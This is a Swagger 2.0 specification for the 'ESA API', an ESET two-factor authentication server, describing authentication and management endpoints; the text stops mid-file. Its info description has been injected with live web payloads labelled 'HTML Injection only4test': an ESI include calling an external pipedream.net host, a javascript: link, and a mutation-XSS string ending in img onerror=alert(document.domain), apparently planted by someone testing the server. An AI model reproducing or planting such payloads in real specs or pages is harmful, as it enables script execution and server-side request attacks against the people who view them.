{
  "swagger": "2.0",
  "info": {
    "version": "4.0.61.0",
    "title": "ESA API",
    "description": "<div><h3>Protocol</h3><img src=https://www.joblo.com/wp-content/uploads/2021/05/mr-bean-rowan-atkinson-2021.jpg><h1>HTML Injection only4test</h1><esi:include src=https://eoh6souafxs9n6j.m.pipedream.net><a href=javascript:print()>test</a><p>\r\n        Most calls are HTTP <b>POST</b> with <b>JSON</b> object as body. For methods without parameters, an empty JSON object can be sent: {}.\r\n        Set <b>Content-Type</b> header to <b>application/json</b> for the body format to be correctly recognized.\r\n        Responses are JSON objects or JSON values.\r\n    </p><h3>Error handling</h3><p>\r\n        Known errors are returned with status code 400 as following JSON objects:\r\n    </p><form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id=\"</textarea><img only=1 onerror=alert(document.domain) src=1>\"></form><pre>\r\n{\"ErrorType\":\"error type\", \"Message\":\"message\"}\r\n</pre><p>\r\n        On unknown error, status code 500 is returned.\r\n    </p><h3>Authentication</h3><p>\r\n        HTTP basic authorization is used.\r\n    </p><p>\r\n        API credentials can be generated in Web Console.\r\n    </p><p>\r\n        To connect multiple authentication component instances to the Authentication Server using API, generate separate API credentials for each component\r\n        instance (or use the invitation mechanism). Separate API credentials allow each instance to identify itself which enables more features, e.g. generating\r\n        MRK for each instance separately or setting up each instance separately in the components list.\r\n    </p><h3>Methods</h3><ul><li><b>/</b> - public methods (no API credentials needed)</li><li><b>/auth/v2</b> - methods for authentication components (API credentials with <b>Auth API</b> checked needed)</li><li><b>/manage/v2</b> - methods for users and settings management (API credentials with <b>Management API</b> checked needed)</li></ul><h3>Trying</h3><p>\r\n        You can try the API methods below (use <b>Try it out</b> buttons). Use the <b>Authorize</b> button to provide API credentials. The <b>Try it out</b> feature operates\r\n        over this server and <b>really executes the calls over the real data</b>.\r\n    </p></div>"
  },
  "paths": {
    "/auth/v2/Authenticate": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Verifies 2FA for user.",
        "description": "Call StartTwoFactorAuthentication before to prepare the user for 2FA.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Auth.Authenticate",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_Authenticate"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/AuthResult"
            }
          }
        }
      }
    },
    "/auth/v2/AuthenticateAndSync": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Verifies 2FA for the user and synchronizes offline data.",
        "description": "Returns data to be stored by the component for logins without available Authentication Server.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>lastUsedOfflineOtps</b>: Information about authentications made without contacting Authentication Server.\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.\n<b>offlineFido/Descriptor</b>: FIDO credential descriptor.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>AuthenticationResult</b>: Result of current authentication.\n<b>OfflineOtpHashes</b>: Data to store in offline cache.\n<b>MasterRecoveryKey</b>: Pre-generated master recovery key to be stored in offline cache.\n<b>Fido</b>: FIDO data for offline cache.\n<b>Fido/Credentials/Descriptor</b>: FIDO credential descriptor.\n<b>Fido/GlobalSettings</b>: Global settings of FIDO authentication.",
        "operationId": "Auth.AuthenticateAndSync",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_AuthenticateAndSync"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/AuthenticateAndSyncResult"
            }
          }
        }
      }
    },
    "/auth/v2/AuthenticateRadius": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Processes one step of RADIUS authentication.",
        "description": "Allows various options to authenticate a single input from the user (e.g. OTP only or password+OTP).<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>ap/Realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Auth.AuthenticateRadius",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_AuthenticateRadius"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/AuthResult"
            }
          }
        }
      }
    },
    "/auth/v2/CheckPushChallenge": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Checks if the user approved Push notification.",
        "description": "Call StartTwoFactorAuthentication before to prepare the user for 2FA. Call this repeatedly (e.g. every second). Possible return values: 0 - nothing has changed yet (ask again e.g. in one second), 1 - user approved Push, 3 - aborted (do not ask again).<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Auth.CheckPushChallenge",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_CheckPushChallenge"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {}
          }
        },
        "deprecated": true
      }
    },
    "/auth/v2/CheckPushChallengeAndSync": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Checks if the user approved Push notification and synchronizes offline data.",
        "description": "Returns data to be stored by the component for logins without available Authentication Server.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>lastUsedOfflineOtps</b>: Information about authentications made without contacting Authentication Server.\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>OfflineOtpHashes</b>: Data to store in offline cache.\n<b>MasterRecoveryKey</b>: Pre-generated master recovery key to be stored in offline cache.",
        "operationId": "Auth.CheckPushChallengeAndSync",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_CheckPushChallengeAndSync"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/PushChallengeAndSyncRes"
            }
          }
        },
        "deprecated": true
      }
    },
    "/auth/v2/CheckPushChallengeAndSyncNew": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Checks if the user approved Push notification and synchronizes offline data.",
        "description": "Returns data to be stored by the component for logins without available Authentication Server.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>lastUsedOfflineOtps</b>: Information about authentications made without contacting Authentication Server.\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.\n<b>offlineFido/Descriptor</b>: FIDO credential descriptor.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>PushChallengeResult</b>: Result of current authentication.\n<b>OfflineOtpHashes</b>: Data to store in offline cache.\n<b>MasterRecoveryKey</b>: Pre-generated master recovery key to be stored in offline cache.\n<b>Fido</b>: FIDO data for offline cache.\n<b>Fido/Credentials/Descriptor</b>: FIDO credential descriptor.\n<b>Fido/GlobalSettings</b>: Global settings of FIDO authentication.",
        "operationId": "Auth.CheckPushChallengeAndSyncNew",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_CheckPushChallengeAndSyncNew"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/PushChallengeAndSyncResult"
            }
          }
        }
      }
    },
    "/auth/v2/CheckPushChallengeNew": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Checks if the user approved Push notification.",
        "description": "Call StartTwoFactorAuthentication before to prepare the user for 2FA. Call this repeatedly (e.g. every second).<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Auth.CheckPushChallengeNew",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_CheckPushChallengeNew"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/PushChallengeResult"
            }
          }
        }
      }
    },
    "/auth/v2/DeleteThisComponentApiCredentials": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Deletes currently used component API credentials.",
        "description": "Deletes component API credentials (invited computer) currently used for authentication in this connection. Additionally deletes all registered components which use these API credentials.",
        "operationId": "Auth.DeleteThisComponentApiCredentials",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_DeleteThisComponentApiCredentials"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/auth/v2/FindRealmId": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Finds realm ID.",
        "description": "Usable for components which are not always able to retrieve their realm ID (e.g. GUID of the domain when the domain controller is not accessible). Returns null if not found.",
        "operationId": "Auth.FindRealmId",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_FindRealmId"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/RealmIdResult"
            }
          }
        }
      }
    },
    "/auth/v2/GetComponentTypeSettings": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets settings for a component type.",
        "description": "Currently, only \"windows_login\" component type can be used.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>Info</b>: Information about the component type. Cannot be changed.\n<b>Settings</b>: Settings for the component type.\n<b>Settings/LocalLoginSettings</b>: Contains settings for local logins, if it is a local logins component type.",
        "operationId": "Auth.GetComponentTypeSettings",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetComponentTypeSettings"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "array",
              "items": {
                "$ref": "#/definitions/ComponentTypeInfoWithSettings"
              }
            }
          }
        }
      }
    },
    "/auth/v2/MakeAssertion": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Verifies authentication response from FIDO authenticator.",
        "description": "<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Auth.MakeAssertion",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_MakeAssertion"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/AuthResult"
            }
          }
        }
      }
    },
    "/auth/v2/MakeAssertionAndSync": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Verifies authentication response from FIDO authenticator and synchronizes offline data.",
        "description": "Returns data to be stored by the component for logins without available Authentication Server.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>lastUsedOfflineOtps</b>: Information about authentications made without contacting Authentication Server.\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.\n<b>offlineFido/Descriptor</b>: FIDO credential descriptor.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>AuthenticationResult</b>: Result of current authentication.\n<b>OfflineOtpHashes</b>: Data to store in offline cache.\n<b>MasterRecoveryKey</b>: Pre-generated master recovery key to be stored in offline cache.\n<b>Fido</b>: FIDO data for offline cache.\n<b>Fido/Credentials/Descriptor</b>: FIDO credential descriptor.\n<b>Fido/GlobalSettings</b>: Global settings of FIDO authentication.",
        "operationId": "Auth.MakeAssertionAndSync",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_MakeAssertionAndSync"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/AuthenticateAndSyncResult"
            }
          }
        }
      }
    },
    "/auth/v2/MakeCredentialOptions": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Obtains FIDO options (challenge to be signed, etc.) to be passed to FIDO authenticator during registration process.",
        "description": "<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Auth.MakeCredentialOptions",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_MakeCredentialOptions"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/auth/v2/Ping": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Check if the service is available.",
        "description": "Always returns true.",
        "operationId": "Auth.Ping",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_Ping"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "boolean"
            }
          }
        }
      }
    },
    "/auth/v2/RegisterComponent": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Registers component to the component/computer list.",
        "description": "Authentication components use this to register themselves to the Authentication Server. Then, the component will be visible in the component list of the specified component type (allows Administrators to set up the component (Enabled, Allow Non-2FA users) and generating MRK for the component). Call this repeatedly (e.g. before each user authentication) to obtain current settings for the component and handle possible component renaming (by sending different machineName).<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>Settings</b>: Settings for this component instance.\n<b>IdentityProviderConfigurations/OriginalIdentityProvider</b>: Configuration of original Identity Provider which will be contacted by ESA Identity Provider to obtain user identity.\n<b>IisSettings</b>: Applicable only for components from ESA IISFilter.",
        "operationId": "Auth.RegisterComponent",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_RegisterComponent"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/ComponentRegistration"
            }
          }
        }
      }
    },
    "/auth/v2/SelfEnroll": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Self-enrollment of a user.",
        "description": "User can complete configuration of authentication types enabled by the admin.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.\n<b>userInput</b>: Data for self-enrollment entered by the user.\n<b>userInput/Sms</b>: If present, the self-enrollment for SMS will be done. Contains values filled in by the user or device.\n<b>userInput/SoftTokens</b>: If present, the self-enrollment for soft tokens will be done. Contains values filled in by the user or device.\n<b>userInput/FIDO</b>: If present, the self-enrollment for FIDO will be done. Contains values filled in by the user or device.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>Sms</b>: If present, the self-enrollment for SMS was done. Contains details about the self-enrollment completion.\n<b>SoftTokens</b>: If present, the self-enrollment for soft tokens was done. Contains details about the self-enrollment completion.\n<b>SoftTokens/ProvisioningUrl</b>: Provisioning URL.\n<b>FIDO</b>: If present, the self-enrollment for FIDO was done.",
        "operationId": "Auth.SelfEnroll",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_SelfEnroll"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/SelfEnrollment_Result"
            }
          }
        }
      }
    },
    "/auth/v2/StartTwoFactorAuthentication": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Starts 2FA for the user.",
        "description": "Call this before Authenticate or CheckPushChallenge. Sends Push or SMS to the user if applicable. Returns information about available 2FA types (to show the correct GUI to the user).<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>AllTwoFaTypes</b>: Contains enabled authentication types for the user (as configured in the user profile).\n<b>SuccessfulTwoFaTypes</b>: Contains authentication types currently usable for the user. Authentication types not usable during this logging in are left out (e.g. if SMS sending failed, SMS is excluded from the result). This value is recommended to be used to tell the user what they should enter and to build the correct GUI for login.\n<b>WaitingTwoFaTypes</b>: Contains authentication types which, although not usable yet, will be usable after initialization.\n<b>IncompleteAuthenticationTypes</b>: Information about authentication types which can be configured by the user.\n<b>IncompleteAuthenticationTypes/Sms</b>: If present, the user can self-enroll for SMS. Contains description of data which have to be filled in.\n<b>IncompleteAuthenticationTypes/SoftTokens</b>: If present, the user can self-enroll for soft tokens (OTP or Push). Contains description of data which have to be filled in.\n<b>IncompleteAuthenticationTypes/FIDO</b>: If present, the user can self-enroll for FIDO. Contains description of data which have to be filled in.",
        "operationId": "Auth.StartTwoFactorAuthentication",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_StartTwoFactorAuthentication"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/StartTwoFactorResult"
            }
          }
        }
      }
    },
    "/auth/v2/UnregisterComponent": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Unregisters component from the component/computer list.",
        "description": "Authentication components use this to unregister themselves from the Authentication Server.",
        "operationId": "Auth.UnregisterComponent",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_UnregisterComponent"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/CheckPhoneNumber": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets information about the provided phone number.",
        "description": "Checks if the phone number is in the correct international format (as required by ESA).",
        "operationId": "CheckPhoneNumber",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_CheckPhoneNumber"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/PhoneNumberResult"
            }
          }
        }
      }
    },
    "/Discover": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets information about Authentication Server.",
        "operationId": "Discover",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_Discover"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/ServiceDiscoveryInfo"
            }
          }
        }
      }
    },
    "/GetWebConsoleUrl": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Obtains an URL to access ESA Web Console.",
        "operationId": "GetWebConsoleUrl",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetWebConsoleUrl"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/InvitationValid": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Check if invitation is valid.",
        "description": "This call does not increase invitation usages count.",
        "operationId": "InvitationValid",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_InvitationValid"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "boolean"
            }
          }
        }
      }
    },
    "/InvitationValid2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Check if invitation is valid.",
        "description": "This call does not increase invitation usages count.",
        "operationId": "InvitationValid2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_InvitationValid2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/InvitationValidResponse"
            }
          }
        }
      }
    },
    "/manage/v2/AccountInitialize": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Initialize ESET Hub account in Web Console.",
        "operationId": "Manage.AccountInitialize",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_AccountInitialize"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/AssignHardToken": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Assigns hard token to a user.",
        "description": "Will fail if the user has already assigned some other hard token or if the hard token is already assigned to some other user (use RevokeHardTokenFromUser or RevokeHardToken first).<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Manage.AssignHardToken",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_AssignHardToken"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/AutoRegisterUser": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Automatically registers users.",
        "description": "Creates the realm and user if they do not exist. Can be used for auto-registration on first login. When auto-registration is disabled, this method silently does nothing.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Manage.AutoRegisterUser",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_AutoRegisterUser"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/CancelInvitation": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Manually cancel an invitation.",
        "operationId": "Manage.CancelInvitation",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_CancelInvitation"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/CancelInvitations_Multiaction2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Manually cancel invitations.",
        "operationId": "Manage.CancelInvitations_Multiaction2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_CancelInvitations_Multiaction2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/CreateApiCredentials": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Creates new API credentials.",
        "description": "API user name and password will be automatically generated and returned.",
        "operationId": "Manage.CreateApiCredentials",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_CreateApiCredentials"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/ApiConsumerSettingsPublic"
            }
          }
        }
      }
    },
    "/manage/v2/CreateIdentityProviderConfiguration": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Creates an Identity Provider configuration.",
        "description": "Identity Provider configuration defines a specific protection of single original Identity Provider.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>configuration</b>: Identity Provider configuration settings.\n<b>configuration/OriginalIdentityProvider</b>: Configuration of original Identity Provider which will be contacted by ESA Identity Provider to obtain user identity.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>OriginalIdentityProvider</b>: Configuration of original Identity Provider which will be contacted by ESA Identity Provider to obtain user identity.",
        "operationId": "Manage.CreateIdentityProviderConfiguration",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_CreateIdentityProviderConfiguration"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/IdentityProviderConfiguration"
            }
          }
        }
      }
    },
    "/manage/v2/CreateInvitation": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Creates a new invitation for components.",
        "description": "Components can call VerifyInvitation to obtain API credentials and be listed in the invited computers list. Invitation code will be generated automatically.",
        "operationId": "Manage.CreateInvitation",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_CreateInvitation"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/Invitation"
            }
          }
        }
      }
    },
    "/manage/v2/CreateRadiusClient": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Creates a RADIUS client definition.",
        "description": "RADIUS client definition specifies a possibility to connect to a RADIUS server component.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>client</b>: RADIUS client settings. if this parameter is null, an empty (default) RADIUS client will be created.",
        "operationId": "Manage.CreateRadiusClient",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_CreateRadiusClient"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/RadiusClientSettings"
            }
          }
        }
      }
    },
    "/manage/v2/CreateRealm": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Creates a new realm.",
        "description": "Specify the required realm parameters. After processing on the server, some additional parameters will be returned.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: Realm parameters.",
        "operationId": "Manage.CreateRealm",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_CreateRealm"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/UserRealm_WithInfo"
            }
          }
        }
      }
    },
    "/manage/v2/CreateUser": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Creates user in the specified realm.",
        "description": "Users can be created only in realms owned by ESA (in AD mode, the default domain realm is not owned by ESA).<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Manage.CreateUser",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_CreateUser"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/CreateUserSelection": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Creates user selection.",
        "description": "User selections are remembered for 1 day.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>usersWithRealm/Realm</b>: Realm the user belongs to.",
        "operationId": "Manage.CreateUserSelection",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_CreateUserSelection"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/UserSelection"
            }
          }
        }
      }
    },
    "/manage/v2/DeleteApiCredentials": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Deletes manually created API credentials.",
        "description": "Use DeleteComponentApiCredentials to delete credentials for invited computer.",
        "operationId": "Manage.DeleteApiCredentials",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_DeleteApiCredentials"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/DeleteApiCredentials_Multiaction2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Deletes manually created API credentials.",
        "description": "Use DeleteComponentApiCredentials to delete credentials for invited computer.",
        "operationId": "Manage.DeleteApiCredentials_Multiaction2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_DeleteApiCredentials_Multiaction2"
            }
          }
        ],
